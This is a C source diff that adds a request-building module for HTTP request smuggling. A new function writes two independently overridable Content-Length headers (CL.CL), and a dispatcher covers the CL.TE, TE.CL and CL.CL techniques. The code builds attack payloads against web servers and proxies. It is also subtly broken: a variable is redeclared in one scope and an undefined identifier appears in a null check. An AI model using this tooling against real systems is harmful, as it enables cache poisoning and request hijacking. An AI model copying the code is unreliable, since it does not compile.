@@ -113,5 +113,64 @@ static rh_err build_te_cl(const char *host_header, const char *path, const char 
 }
 
 /*
- * 
+ * CL.CL two Content-Length headers with (by default) the same, correct value - the 
+ * techinque only does anything once the caller overrides one of them to disagree, which
+ * is exactly why both are independently overridable rather than this function picking a
+ * "sensible" mismatch on the caller's behalf.
  * */
+static rh_err build_cl_cl(const char *host_header, const char *path, const char *smuggled,
+                        long cl1_override, long cl2_override, rh_buf *out)
+{
+    unsigned long long body_len = strlen(smuggled);
+    unsigned long long cl1 = cl1_override >= 0 ? (unsigned long long)cl1_override : body_len;
+    unsigned long long cl2 = cl2_override >= 0 ? (unsigned long long)cl2_override : body_len;
+    
+    RH_APPEND_LIT(out, "POST ");
+    RH_APPEND_STR(out, path);
+    RH_APPEND_LIT(out, " HTTP/1.1\r\nHost: ");
+    RH_APPEND_STR(out, host_header);
+    RH_APPEND_LIT(out, "\r\nContent-Length: ");
+    
+    rh_err e = append_uint(out, cl1);
+    if (e != RH_OK) return e;
+
+    RH_APPEND_LIT(out, "\r\nContent-Length: ");
+
+    rh_err e = append_uint(out, cl2);
+    if (e != RH_OK) return e;
+
+    RH_APPEND_LIT(out, "\r\n\r\n");
+    RH_APPEND_STR(out, smuggled);
+
+    return RH_OK;
+}
+
+rh_err rh_smuggle_build(rh_smuggle_technique technique, const char *host_header, const char *path, const char *smuggled, long cl1_override, long cl2_override, rh_buf *out)
+{
+    if (!host_header || !path || !smuggle || !*smuggled || !out) return RH_ERR_INVAL;
+
+    rh_err e = rh_buf_init(out, 0);
+    if (e != RH_OK) return e;
+
+    switch (technique)
+    {
+        case RH_SMUGGLE_CL_TE:
+            e = build_cl_te(host_header, path, smuggled, cl1_override, out);
+            break;
+        case RH_SMUGGLE_TE_CL:
+            e = build_te_cl(host_header, path, smuggled, cl1_override, out);
+            break;
+        case RH_SMUGGLE_CL_CL:
+            e = build_cl_cl(host_header, path, smuggled, cl1_override, cl2_override, out);
+            break;
+        default:
+            e = RH_ERR_INVAL;
+            break;
+    }
+    
+    if (e != RH_OK) rh_buf_free(out);
+    return e;
+}
+
+#undef RH_APPEND_LIT
+#undef RH_APPEND_STR
